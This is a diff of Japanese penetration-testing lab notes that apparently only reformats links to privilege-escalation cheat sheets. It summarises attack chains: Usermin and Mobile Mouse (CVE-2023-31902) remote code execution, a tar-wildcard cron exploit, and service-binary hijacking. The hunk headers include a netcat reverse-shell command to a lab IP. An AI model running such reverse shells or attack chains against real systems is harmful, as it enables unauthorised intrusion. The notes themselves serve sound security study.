@@ -63,7 +63,7 @@ busybox nc 192.168.45.237 4444 -e sh
 
 3. Usermin 1.820 - Remote Code Execution (RCE) (Authenticated)を用いて、初期侵入
 
-4. cron jobで`tar`がワイルドカード(`*`)で実行されていたため、[[💥Linux Privilege Escalation#Unix Wildcards Gone Wild]]でエクスプロイトし、権限昇格
+4. cron jobで`tar`がワイルドカード(`*`)で実行されていたため、[💥Linux Privilege Escalation](../Cheatsheet/🐧Linux/💥Linux%20Privilege%20Escalation.md#Unix%20Wildcards%20Gone%20Wild)でエクスプロイトし、権限昇格
 
 
 ---
@@ -73,4 +73,4 @@ busybox nc 192.168.45.237 4444 -e sh
 1. Nmapの結果、Mouse Serverが動作していたため、エクスプロイトを検索し、Mobile Mouse 3.6.0.4 Remote Code Execution Exploit（[CVE-2023-31902](https://nvd.nist.gov/vuln/detail/CVE-2023-31902)）を利用して、初期侵入
 	- 他に攻撃ベクターが見つからない場合は、バージョン情報がわからずとも、エクスプロイトを実行してみるのも１つの手
 
-2. サービスバイナリが書き換え可能、かつ、LocalSystemによって実行されていたため、[[💥Windows Privilege Escalation#Service Exploits - Service Binary Hijacking]]で権限昇格
+2. サービスバイナリが書き換え可能、かつ、LocalSystemによって実行されていたため、[💥Windows Privilege Escalation](../Cheatsheet/🪟Windows/💥Windows%20Privilege%20Escalation.md#Service%20Exploits%20-%20Service%20Binary%20Hijacking)で権限昇格
